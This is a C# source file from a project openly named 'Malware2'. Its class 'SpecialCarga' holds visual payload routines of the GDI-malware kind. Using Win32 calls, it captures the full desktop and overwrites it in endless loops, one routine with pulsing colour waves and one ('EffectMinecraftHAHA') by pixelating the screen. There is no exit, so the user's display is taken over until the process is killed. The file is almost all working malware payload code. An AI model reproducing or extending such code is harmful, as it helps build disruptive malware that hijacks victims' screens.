using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Malware2
{
    public class SpecialCarga
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateDIBSection(IntPtr hdc, ref BITMAPINFO pbmi, uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
                                              IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);

        private const int SRCCOPY = 0x00CC0020;
        private const int BI_RGB = 0;

        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biCompression;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public RGBQUAD[] bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RGBQUAD
        {
            public byte rgbBlue;
            public byte rgbGreen;
            public byte rgbRed;
            public byte rgbReserved;
        }

        public unsafe static void EffectSpecial1()
        {
            IntPtr dc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(dc);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            BITMAPINFO bmpi = new BITMAPINFO();
            bmpi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmpi.bmiHeader);
            bmpi.bmiHeader.biWidth = w;
            bmpi.bmiHeader.biHeight = -h; // Negativo para rasterização top-down
            bmpi.bmiHeader.biPlanes = 1;
            bmpi.bmiHeader.biBitCount = 32;
            bmpi.bmiHeader.biCompression = BI_RGB;

            IntPtr ppvBits;
            IntPtr bmp = CreateDIBSection(dc, ref bmpi, BI_RGB, out ppvBits, IntPtr.Zero, 0);
            SelectObject(dcCopy, bmp);

            RGBQUAD* rgbquad = (RGBQUAD*)ppvBits.ToPointer();
            double centerX = w / 2.0;
            double centerY = h / 2.0;
            double scale = 1.0;
            double pulsationRate = 0.1;

            while (true)
            {
                StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

                for (int x = 0; x < w; x++)
                {
                    for (int y = 0; y < h; y++)
                    {
                        int index = y * w + x;

                        double distance = Math.Sqrt(Math.Pow(x - centerX, 2) + Math.Pow(y - centerY, 2));

                        // Aplica uma variação na intensidade com base na distância do centro
                        rgbquad[index].rgbRed = (byte)(12 + 120 * Math.Sin(distance * scale / w * 2 * 9));      // Efeito 1
                        rgbquad[index].rgbGreen = (byte)(1 * 110 * Math.Sin(distance * scale / h * 2 * 3333));  // Efeito 2
                        rgbquad[index].rgbBlue = (byte)(128 + 120 * Math.Sin(distance * scale / (w + h) * 2 * 9)); // Efeito 3
                    }
                }

                scale += pulsationRate;
                centerX = w / 2.0 + w / 4.0 * Math.Cos(scale * 0.5);
                centerY = h / 2.0 + h / 4.0 * Math.Sin(scale * 0.5);

                StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
            }

            ReleaseDC(IntPtr.Zero, dc);
        }

        public static void EffectMinecraftHAHA()
        {
            IntPtr dc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(dc);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            BITMAPINFO bmpi = new BITMAPINFO();
            bmpi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmpi.bmiHeader);
            bmpi.bmiHeader.biWidth = w;
            bmpi.bmiHeader.biHeight = h;
            bmpi.bmiHeader.biPlanes = 1;
            bmpi.bmiHeader.biBitCount = 32;
            bmpi.bmiHeader.biCompression = BI_RGB;

            IntPtr ppvBits;
            IntPtr bmp = CreateDIBSection(dc, ref bmpi, 0, out ppvBits, IntPtr.Zero, 0);
            SelectObject(dcCopy, bmp);

            int blockSize = 4;

            unsafe
            {
                RGBQUAD* rgbquad = (RGBQUAD*)ppvBits;

                while (true)
                {
                    StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

                    for (int y = 0; y < h; y += blockSize)
                    {
                        for (int x = 0; x < w; x += blockSize)
                        {
                            RGBQUAD blockColor = rgbquad[y * w + x];

                            for (int dy = 0; dy < blockSize; dy++)
                            {
                                for (int dx = 0; dx < blockSize; dx++)
                                {
                                    int px = x + dx;
                                    int py = y + dy;

                                    if (px < w && py < h)
                                    {
                                        rgbquad[py * w + px] = blockColor;
                                    }
                                }
                            }
                        }
                    }

                    StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
                }
            }

            ReleaseDC(IntPtr.Zero, dc);
        }
    }
}
